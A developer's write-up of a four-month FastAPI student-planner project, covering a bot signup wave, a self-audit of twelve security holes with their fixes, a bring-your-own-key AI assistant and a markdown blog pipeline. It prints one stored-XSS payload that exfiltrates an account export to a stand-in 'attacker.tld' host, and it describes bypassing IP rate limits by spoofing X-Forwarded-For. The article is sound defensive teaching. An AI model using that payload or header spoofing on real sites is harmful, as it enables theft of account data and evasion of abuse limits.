# 176 bots, an AI assistant that runs on the user's own key, and 334 articles: four months of building a product and then taking it apart

> English version of the article. For dev.to, Hacker News (Show HN), Reddit and Indie Hackers.
> Screenshots live in `docs/habr-screenshots/`.
> Author: Yaroslav Boev (SwairIt) — getdoday.ru

---

Four months ago I started writing an ordinary todo app in FastAPI. Today `getdoday.ru` is a planner for students, and next to it live a few more products: a school Q&A site, a traffic-rules trainer, a booking cabinet for tutors. One monolith, 86,000 lines of code, 1,325 tests.

Then 176 bots signed up in two weeks.

I went in to find out how they got through — and came out with twelve holes, none of which had anything to do with bots. Stored XSS on public pages. Other people's tasks served by a single ID. A session that couldn't be revoked, not even by changing the password. And the one that still stings: **IP rate limits that were bypassed with a single HTTP header** — I proved it against my own production server and got zero rejections out of forty requests.

Three stories below, all with code:

1. **Bots and security.** What the attack looked like, why all three layers of my signup protection were useless, and what a full audit turned up.
2. **An AI assistant that runs on the user's own API key.** Why I refused to pay for tokens, how it works (key encryption, SSE streaming in FastAPI, quotas) and four traps — including an async generator that silently ate answers.
3. **A semantic core and 334 articles.** What a content section looks like when you build it like software: one source of truth, automated checks, and a 17× speedup.

---

# Part 1. Bots that walked through three layers of protection

## What it looked like

In two weeks the database grew by 238 accounts. 62 confirmed their email. The other 176 were bots: addresses on `yahoo.com`, `hotmail.com`, `aol.com`, corporate mailboxes from old leaks — and among them `sdffsd.sdd`, `flsdfmsodf.ro`, `prweorwef.com`.

This was not a targeted attack. It was ordinary form spam: someone runs a list of sites and posts into anything that looks like a signup form. Which is exactly why the story is useful — anyone who ships a public form meets this.

I did have protection. Three layers:

1. **Honeypot** — a hidden field a human never sees and a bot fills in.
2. **Rate limiting** — 5 signups per minute per IP.
3. **Email confirmation** — a link in a letter.

None of them worked. The reasons are all different, and all three are instructive.

## Hole one: a limit that resets on every deploy

First, the arithmetic. Five per minute is 300 an hour and 7,200 a day. That is not a limit, that is a formality.

But the real problem was where it lived:

```python
_ATTEMPTS: dict[str, deque[float]] = {}


def hit(key: str, *, max_calls: int, per_seconds: float) -> bool:
    now = monotonic()
    bucket = _ATTEMPTS.setdefault(key, deque())
    cutoff = now - per_seconds
    while bucket and bucket[0] < cutoff:
        bucket.popleft()
    if len(bucket) >= max_calls:
        return False
    bucket.append(now)
    return True
```

A sliding window in process memory. And here is the detail that kills it: **a push to master restarts the service**. Auto-pull, migrations, restart — about a minute. I make between five and forty commits a day.

The counter was being wiped several times an hour. It didn't protect anything; it merely existed.

There's a second subtlety I found later: uvicorn runs with two workers, each with its own dictionary. So the effective limit was 10, not 5, and which worker you hit is luck.

**Takeaway:** an in-memory counter is protection against accidental double-clicks, not against a bot. State that must survive a restart belongs in the database.

## Hole two: an IP you can forge with one header

This is the interesting one, and I found it by accident — I simply wanted to check whether the limit worked at all.

The service runs behind nginx. To see the real client address rather than the proxy's, uvicorn starts with:

```
--proxy-headers --forwarded-allow-ips='*'
```

Looks harmless: "trust headers from the proxy". Now look at uvicorn's own source:

```python
def get_trusted_client_host(self, x_forwarded_for: str) -> str:
    x_forwarded_for_hosts = _parse_raw_hosts(x_forwarded_for)
    if self.always_trust:
        return x_forwarded_for_hosts[0]   # the LEFTMOST element
```

With `--forwarded-allow-ips='*'` the `always_trust` branch takes the **leftmost** element of `X-Forwarded-For`.

And here is how nginx builds that header:

```nginx
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```

`$proxy_add_x_forwarded_for` is "whatever the client sent" plus the real address appended **on the right**. If the client sends `X-Forwarded-For: 1.2.3.4`, the app receives `1.2.3.4, 93.x.x.x`, where the second one is real.

uvicorn takes the first. The one written by the client.

Forty requests against my own login endpoint (a non-existent address; no accounts were created):

| Scenario | Result |
|---|---|
| Fixed spoofed `X-Forwarded-For: 203.0.113.7` | **429: 20**, 401: 20 — the limit hit the spoofed address |
| Immediately after, rotating `X-Forwarded-For` | **429: 0**, 401: 40 — the limit never fired |

If the header were ignored, the second phase would have inherited the already-full bucket of the real address and returned 429. It returned zero.

So **every IP-based limit I had was bypassed by one header line**: signup, login, anonymous page flood protection.

Two fixes. On the server, the correct flag value:

```
--forwarded-allow-ips=127.0.0.1
```

And in the application I stopped depending on how uvicorn was started:

```python
def client_ip(request: Request) -> str | None:
    """The real client address, which cannot be forged with a header.

    nginx appends the real address on the RIGHT ($proxy_add_x_forwarded_for),
    so we take the last element — it was written by our proxy, not by a guest.
    """
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        parts = [p.strip() for p in forwarded.split(",") if p.strip()]
        if parts:
            return parts[-1]
    return request.client.host if request.client else None
```

To be honest about the limits of this: "take the rightmost" is correct for exactly one proxy. Behind a chain (CDN → nginx) the rightmost is the first proxy's address — not the real client, but also not forgeable.

**Takeaway:** if your app makes decisions based on IP, it must know which source of that IP it trusts. `'*'` doesn't mean "trust the proxy", it means "trust anyone".

## Hole three: email confirmation that confirmed nothing

There was a column, `email_verified_at`. The letter was sent, the link worked, the timestamp was written.

Then I grepped the whole project for places where that column gates anything. There were none. The auth service even had an honest comment:

```python
# Email verification is "soft": unverified users may sign in.
```

A bot registered and immediately used the account. Email confirmation was decoration.

Here I made a call some will disagree with: **I did not make the check hard**. Letters get lost, land in spam, or arrive at a mailbox a teenager can't open on their phone. A hard gate would cut off real people to stop bots that can be stopped more cheaply.

Instead: accounts with no confirmed email, no tasks, no Telegram link and no tutor profile are deleted automatically after 30 days.

## What I put in place instead

Three measures, none of which needs JavaScript — a bot doesn't run it, and a real browser passes them invisibly.

**1. A signed form timestamp.** The form carries the time it was rendered. Signed, otherwise a bot just writes "five seconds ago":

```python
def issue_form_token() -> str:
    ts = f"{datetime.now(UTC).timestamp():.0f}"
    return f"{ts}.{_sign(ts)}"


def _sign(ts: str) -> str:
    secret = get_settings().app_secret_key.encode()
    return hmac.new(secret, f"register:{ts}".encode(), hashlib.sha256).hexdigest()[:32]
```

If it arrives instantly, or without a timestamp, or with a forged one, the signup is rejected. That kills the entire "POST directly against a list of URLs" class.

**2. Counting signups in the database, not in memory.** Users gained two columns: `signup_ip` and `signup_subnet` (the first three octets). The subnet matters — changing the last octet costs nothing.

```python
MAX_PER_IP_HOUR = 5
MAX_PER_SUBNET_HOUR = 30
```

The allowance is deliberately generous. My audience sits behind school NAT and mobile CGNAT, where a hundred people look like one address. Cloudflare has published measurements showing CGNAT addresses get rate-limited three times more often while containing *fewer* bots. A computer-science lesson where a class signs up at once must not hit the wall.

There's also a guard against my own mistake: if the app sees an internal address (`127.0.0.1`, private ranges), the proxy didn't set the header and the real client is unknown. Treating everyone as one person would lock the entire site out after five signups an hour.

**3. Checking that the email domain exists.** Here I got a surprise. I was about to wire up disposable-email lists — and found they were useless against my bots: not one of the observed domains was a temp-mail service. But `sdffsd.sdd`, `flsdfmsodf.ro` and `prweorwef.com` are NXDOMAIN: no MX, no A record. A letter physically cannot be delivered there.

One DNS check removes them entirely, and it fails open: a resolver timeout must never block a real person.

What I deliberately did **not** do: reject addresses with "many digits in a row". Plenty of my real users have a phone number as their mailbox name. A rule that catches bots together with humans is worse than no rule.

## And an alarm

I noticed the 176 bots after the fact, digging through the database by hand. Now every signup counts accounts created in the last hour, and if it crosses twenty I get an email.

That is the cheapest measure of them all and the most underrated. Protection can be bypassed. A wave going unnoticed must not happen.

---

# Part 2. The audit: twelve holes that had nothing to do with bots

Since I was already in there, I went through the whole project: auth, access control, payments, secret storage, XSS, SSRF. Here are the ones worth showing.

## Stored XSS through JSON-LD

The prettiest find. Public Q&A pages carried structured data for search engines:

```python
"jsonld": json.dumps(jsonld, ensure_ascii=False),
```

```html
<script type="application/ld+json">{{ jsonld | safe }}</script>
```

Looks safe: `json.dumps` escapes quotes and backslashes, so string injection is impossible.

Except the HTML parser knows nothing about JSON. It closes `<script>` at the first `</script` sequence, wherever it appears. And the JSON-LD carries the question title, written by any registered user:

```
How do I solve</script><script>fetch('/api/backup/export',{credentials:'include'})
  .then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.tld/x',t))</script>this
```

The question page is public. The script would run for every visitor, including logged-in ones, and `/api/backup/export` returns a full account dump.

The fix is one layer, now applied to every JSON that goes inside a `<script>`:

```python
_REPLACEMENTS = (
    ("<", "\\u003c"),
    (">", "\\u003e"),
    ("&", "\\u0026"),
    (" ", "\\u2028"),
    (" ", "\\u2029"),
)


def script_json(data: Any) -> str:
    out = json.dumps(data, ensure_ascii=False)
    for char, escaped in _REPLACEMENTS:
        out = out.replace(char, escaped)
    return out
```

For JSON, `<` is the same character. For the HTML parser, it's an ordinary letter. U+2028 and U+2029 are there for a reason: they're valid in JSON but terminate a line for the JavaScript parser.

**Takeaway:** "I escaped the JSON" and "this is safe inside `<script>`" are different statements. An HTML parser with its own rules stands between them.

## IDOR: other people's tasks by project ID

The task-listing service looked like this:

```python
if project_id is not None:
    # Project-scoped view: show all members' tasks in that project.
    stmt = select(Task).where(Task.project_id == project_id)
else:
    stmt = select(Task).where(Task.user_id == user_id)
```

With `project_id` set, the owner filter was dropped: inside a project, members see each other's tasks by design. Membership was supposed to be verified by the caller — the docstring said so.

The HTML view did verify it. The JSON endpoint `GET /api/tasks?project_id=<uuid>` did not.

Result: any authenticated user who knew a project ID could read all of its tasks. The most realistic scenario is a removed member: kicked out everywhere else, still reading through this endpoint.

The fix is three lines, but in the right place — inside the service, not the caller:

```python
if project_id is not None:
    if not await is_member(session, project_id, user_id):
        raise ProjectNotFound(str(project_id))
    stmt = select(Task).where(Task.project_id == project_id)
```

**Takeaway:** "the caller must check" is an agreement, not a defence. Agreements are broken silently. The check belongs where the data is.

## An anonymous visitor filling someone's calendar

The tutor cabinet has a public booking page: pick a free slot, book it, no auth required. By design.

Free slots are computed by a function that accounts for working days and hours, buffers between lessons, vacation, lead time and existing bookings. Nice.

Except the server accepted the submitted time **as-is** and checked exactly one thing: whether that exact moment was already taken. Everything else was a UI-only filter.

So an anonymous POST could book 3 a.m., a vacation day, or last week — and every confirmed booking becomes a busy interval. A calendar can be filled months ahead in a minute.

Plus a second layer: the client's email field was a plain string rather than a validated address, and a letter was sent to it. The booking form was a free relay from my SMTP identity to any address.

## A leak through the iCal feed

Tutors are invited to subscribe to their calendar in Google or Apple Calendar. A link with a token; events inside.

The description of every event contained the client's name, **email**, and a **management link** — a capability URL that cancels or reschedules that booking.

So a feed URL that the tutor hands to a third-party calendar service, and which travels in a query string (and therefore lands in nginx logs and Referer headers), contained the personal data of every client and capability tokens for their bookings.

Both are gone now. The name stays — the tutor needs to know who's coming.

## A session that couldn't be revoked

Sessions lived only in a signed cookie — no server-side state. Elegant and database-free, but there's a price: **there is nothing to revoke**.

Changing the password rewrote the hash while a stolen cookie kept working for the full two weeks Starlette signs sessions for.

The fix is a session epoch. One integer on the user, written into the cookie at login and compared on every request:

```python
user = await session.get(User, uid)
if user is None:
    return None
# Cookies issued before this field exist without an epoch —
# treat them as zero so nobody gets logged out on deploy.
if int(request.session.get("epoch", 0)) != user.session_epoch:
    request.session.clear()
    return None
return user
```

Changing the password bumps the number, so every other session stops matching — including the one the password is being changed because of. The current one stays alive: its epoch is refreshed immediately.

## The rest, briefly

- **A school-diary access token stored in plaintext.** The app can pull homework from an electronic school diary; the access token sat in the database as text with a comment saying "should be encrypted before production". Now it's Fernet with a key derived from the app secret via PBKDF2 and its own salt. Legacy rows are still readable and get re-encrypted on next save.
- **Cookies leaking into a neighbouring project.** A proxy to a game running on an adjacent port forwarded headers wholesale — including the main site's session cookie — and passed its `Set-Cookie` back. Stripped in both directions.
- **A CSRF exemption wider than needed**, covering a whole path prefix when only one endpoint had its own auth.
- **SSRF in "bring your own provider"** — more on that below.
- **An email-confirmation token written to the log** in full, valid for three days.
- **No Content-Security-Policy from the app at all** — the only one lived in an nginx config, in a single `location` block.

---

# Part 3. An AI assistant that runs on the user's own key

## Why not my key

The obvious approach: take a provider key, put it in the environment, serve answers to everyone. Three reasons I didn't.

**Money.** The audience is students, the product is free. Any spike in popularity turns into a bill the author pays. One runaway loop in someone's script and the balance is gone overnight.

**Responsibility.** If the key is mine, I'm the one making the requests. Then the content of the conversation is on me too.

**Law.** A request to a foreign provider is a cross-border transfer of personal data. For a Russian service with an under-18 audience, that's a separate obligation — I'll come back to it.

So: **everyone connects their own key.** No dependency on my limits, I don't read anyone's conversations, and the bill goes to whoever spends it.

## Storing someone else's key

```python
KEY_VERSION = 1
_SALT_V1 = b"doday-ai-provider-key-v1"


def _fernet_for_version(version: int) -> Fernet:
    if version != KEY_VERSION:
        raise AiKeyError(f"unknown key encryption version: {version}")
    secret = get_settings().app_secret_key.encode("utf-8")
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=_SALT_V1, iterations=100_000)
    return Fernet(base64.urlsafe_b64encode(kdf.derive(secret)))
```

Two decisions worth explaining. The encryption key is **derived deterministically** from the app secret — nothing extra to store, and it survives the restarts my deploy causes constantly. And the **schema version sits next to the ciphertext**: when the salt or algorithm changes, a branch is added to `_fernet_for_version` and old rows keep working. One column now saves a data migration later.

The key is never shown again — the UI displays the last four characters.

## Streaming in FastAPI

FastAPI 0.115 has no SSE primitive, so it's `StreamingResponse` by hand:

```python
return StreamingResponse(
    events(),
    media_type="text/event-stream",
    headers={
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        # Without this nginx buffers the response and streaming
        # turns into "nothing happens, then everything at once".
        "X-Accel-Buffering": "no",
    },
)
```

`POST`, because `EventSource` only speaks `GET` and the prompt is more comfortable in a body. The front end reads it with `fetch` + `ReadableStream`. `proxy_buffering off` and `gzip off` are duplicated in the nginx location — compression buffers too.

## The trap that ate answers

A user wrote to me: "I asked something, the AI stopped mid-sentence, and after I left the page the history was empty."

The saving code looked bulletproof:

```python
async def events() -> AsyncIterator[str]:
    collected: list[str] = []
    try:
        async for chunk in stream_completion(...):
            collected.append(chunk)
            yield f"data: {chunk}\n\n"
    except AiProviderError as exc:
        yield f"event: error\ndata: {exc.user_message}\n\n"
        return
    finally:
        answer = "".join(collected).strip()
        if answer:
            await save_message(session, user.id, role="assistant", content=answer)
    yield "event: done\ndata: ok\n\n"
```

Whatever happens, `finally` saves what was collected. Right?

`finally` in an async generator runs at a very inconvenient moment. When the client disconnects, the generator is closed and `GeneratorExit` is thrown in at the `yield`. Inside `finally` we then `await` the database — whose session is already closing along with the dropped connection. And a `yield` after `GeneratorExit` is a `RuntimeError: async generator ignored GeneratorExit`.

The outcome is exactly what the user described.

The fix is not to heroically save everything at the end, but to **save as you go**:

```python
saved_id: UUID | None = None
saved_len = 0
async for chunk in stream_completion(...):
    collected.append(chunk)
    yield f"data: {chunk}\n\n"
    text = "".join(collected)
    if len(text) - saved_len >= _SAVE_EVERY_CHARS:   # every 100 characters
        saved_id = await save_answer_progress(
            session, user.id, task_id=task_id, message_id=saved_id, content=text
        )
        saved_len = len(text)
```

The final write moved out of `finally` into the normal flow. If the connection dropped, we never reach it — and that's fine: the database already holds what was on screen.

**Takeaway:** `finally` in an async generator is not a place for external resources. State that must be persisted should be persisted as it appears.

## Provider traps

The app speaks the OpenAI-compatible protocol, so one client works with all of them. In theory.

**One provider answers `400`, not `401`, for a bad key.** Classifying errors by status code breaks immediately: the user sees "provider is unavailable" instead of "check your key".

**An error from one provider can arrive from another.** A real support conversation: "it says the key isn't accepted", and the provider's response reads `invalid api key secret: illegal base64 data at input byte 0`. I checked which provider emits that phrase — and it wasn't the one the user thought he'd chosen. The dropdown defaulted to provider A while the instructions above it were rendered for provider B, so it looked pre-selected.

**And the big one. Probing an endpoint with a deliberately invalid key proves nothing.** I probed a dozen providers from a Russian address, got sensible auth errors, and concluded they worked. Then a user connected a real Google key and got:

```json
{"error": {"code": 400, "message": "User location is not supported for the API use.",
           "status": "FAILED_PRECONDITION"}}
```

The request originates from my server, which is in Russia. With an invalid key Google answers about the key before it ever gets to the location check — so "does the endpoint respond?" produced a false positive.

Geo-blocking now has its own message, separate from "bad key". And, more usefully, the provider's own response (key stripped, markup removed, capped at 300 characters) is attached to our friendly message — without it, a user sees "key not accepted" and cannot tell whether to fix the key, the model or the billing plan.

## SSRF I built myself

The provider list has a "bring your own OpenAI-compatible endpoint" option. The only validation was `startswith("https://")`.

So a user could point it at an internal address and my server would dutifully go there — and the different error messages per status code turned it into an internal network scanner. Now the hostname is resolved and non-global addresses are rejected. The resolve→request race remains, and for a stricter threat model you'd pin the resolved address and forbid redirects.

---

# Part 4. A semantic core and 334 articles

A product for students can't be promoted with paid ads: the audience has no money and conversion to payment is low by definition. That leaves search.

## Content as code

The decision that saved weeks: **articles are markdown files in the repository**, not rows in a database behind an admin panel.

Edits go through git with history and review, articles are covered by automated tests, publishing needs no admin UI, and deployment is the same `git push`. The single downside — fixing a typo requires repository access — is not a downside for a one-person project.

Every article starts with frontmatter: title, summary, category, tags, keywords, publication date, and a `faq: true` flag meaning the body contains a "Frequently asked" section, from which `FAQPage` structured data is generated. One field in a file header turns into a rich snippet in search results.

## Automated checks instead of proofreading

334 articles cannot be re-read by eye before every deploy. A script runs as an ordinary test and verifies: frontmatter validity, slug uniqueness, minimum length, at least four H2 sections, presence of the FAQ block, that every internal link points at an existing article or a real page, and that the category exists.

Plus a list of forbidden claims:

```python
_FORBIDDEN = (
    ("14 days pro", "there is no trial — we must not promise 14 days of Pro"),
    ("saml", "SAML SSO does not exist in the product"),
)
```

Promising a feature that doesn't exist isn't "marketing licence" — it's the reason someone leaves and doesn't come back. A CI check is cheaper than handling the complaint.

## From 11.7 seconds to 0.67

The first version parsed all markdown on request. With three hundred articles the blog index took **11.7 seconds**. That isn't slow, that's broken.

The fix is a disk cache keyed by a fingerprint of the corpus: file names, sizes, modification times. Change one file and the fingerprint changes and the cache rebuilds; otherwise a ready-made JSON is read. Plus a warm-up in a background thread at startup, so the first visitor doesn't pay for parsing with their wait.

Result: **0.67 seconds**. Seventeen times faster.

One note on the format: JSON, not pickle. Pickle is faster and more convenient, but it's an executable format — a cache file someone can reach becomes arbitrary code execution. Milliseconds aren't worth that.

---

# Part 5. Privacy as an engineering problem

Working through data-protection law, I reached cross-border transfers. The rule is simple: if data leaves the country, that's a separate obligation.

And my provider list contained foreign ones. The user supplies the key, but my server initiates the request, and the prompt is the user's data.

**I removed every foreign provider.** Only domestic ones remain. The price is honest: the free options disappeared, the remaining ones need a card. In exchange the cross-border question is closed entirely rather than "probably fine".

Three more changes in the same direction, all about not keeping what you don't need:

- **The signup IP lives for one day.** It's needed for exactly one hour, to count signups per address and subnet. After that it's a useless but sensitive trace.
- **Abandoned accounts are deleted after 30 days** — no confirmed email, no tasks, no Telegram link, no tutor profile.
- **A "My data" page.** What's stored: email, registration date, counts of tasks and messages, whether the diary is connected, whether the IP is still kept. Plus export in one file and account deletion.

That last one is the most underrated. Complaints to regulators almost never start with a leak; they start with a person who couldn't see what was collected about them and couldn't take it back. Two buttons remove the reason to write anywhere.

While I was there I re-read the privacy policy and found the phrase "no third-party analytics trackers" — while an analytics counter sat on every page. It was written honestly, but long ago; then the product changed and the text didn't.

**Takeaway:** a privacy policy is not a legal artefact you write once. It's product documentation, and it goes stale exactly like a README.

---

# Numbers and stack

| Metric | Value |
|---|---|
| Lines of code | 86,010 (38,012 Python + 26,851 templates + 21,147 tests) |
| Tests | 1,325 |
| Commits | 768 |
| Migrations | 59 |
| Application modules | 43 |
| Blog articles | 334 (617,186 words) |
| Project age | 4 months |

Stack: FastAPI, async SQLAlchemy 2.0, Pydantic v2, PostgreSQL, Alembic, Jinja2, HTMX, Alpine.js, Tailwind. Tooling: uv, ruff, mypy --strict, GitHub Actions. Deployment is `git push`: auto-pull, migrations, restart, about a minute.

I work alongside a terminal AI agent and don't hide it. The decisions and the mistakes here are mine; the code review and the proofreading are shared. The audit in Part 2 is a direct product of that setup — I would not have gone through my own codebase end to end by hand.

**Source code on GitHub** — github.com/SwairIt/doday

The product itself is at `getdoday.ru`. My other projects live at `all.getdoday.ru`.

---

# Three things I took away

**Protection you cannot verify is not protection.** The IP limit looked like it worked right up until I sent forty requests with a forged header. Every claim of the form "we have protection against X" deserves a manual test.

**A false positive is worse than no check.** The Google story is exactly that: the endpoint answered, the error looked sensible, the conclusion was wrong. Test the same path your users will take, not the one next to it.

**Sometimes the law outranks the architecture.** I removed half the provider list not because those providers worked badly, but because moving data across a border is a separate responsibility. The engineering decision lost to the legal one, and that's fine.

One more thing: everything above is about products that already run. In parallel I'm building **Persona**, and it's structured on entirely different principles. That's a separate article.

Thanks for reading.

*Yaroslav Boev — getdoday.ru*
